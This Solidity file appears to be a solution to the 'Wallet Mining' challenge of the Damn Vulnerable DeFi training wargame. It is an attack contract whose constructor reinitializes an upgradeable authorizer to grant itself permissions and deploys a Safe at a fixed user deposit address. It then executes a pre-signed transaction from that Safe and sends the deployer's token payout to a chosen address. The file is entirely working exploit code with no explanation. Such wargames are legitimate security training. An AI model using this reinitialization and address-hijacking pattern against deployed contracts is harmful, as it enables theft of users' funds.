// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract AttackWalletMining {
    address constant USER_DEPOSIT_ADDRESS = 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b;

    constructor(
        AuthorizerUpgradeable authorizer,
        WalletDeployer walletDeployer,
        bytes memory wat,
        uint256 salt,
        bytes memory execT_data,
        address ward
    ) {
        address attack = address(this);
        address[] memory _wards = new address[](1);
        address[] memory _aims = new address[](1);
        _wards[0] = attack;
        _aims[0] = USER_DEPOSIT_ADDRESS;
        authorizer.init(_wards, _aims);
        walletDeployer.drop(USER_DEPOSIT_ADDRESS, wat, salt);

        {
            (
                address to,
                uint256 value,
                bytes memory data,
                Enum.Operation operation,
                uint256 safeTxGas,
                uint256 baseGas,
                uint256 gasPrice,
                address gasToken,
                address payable refundReceiver,
                bytes memory signatures
            ) = abi.decode(
                execT_data,
                (address, uint256, bytes, Enum.Operation, uint256, uint256, uint256, address, address, bytes)
            );

            Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
                to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, signatures
            );
        }

        DamnValuableToken(walletDeployer.gem()).transfer(ward, walletDeployer.pay());
    }
}
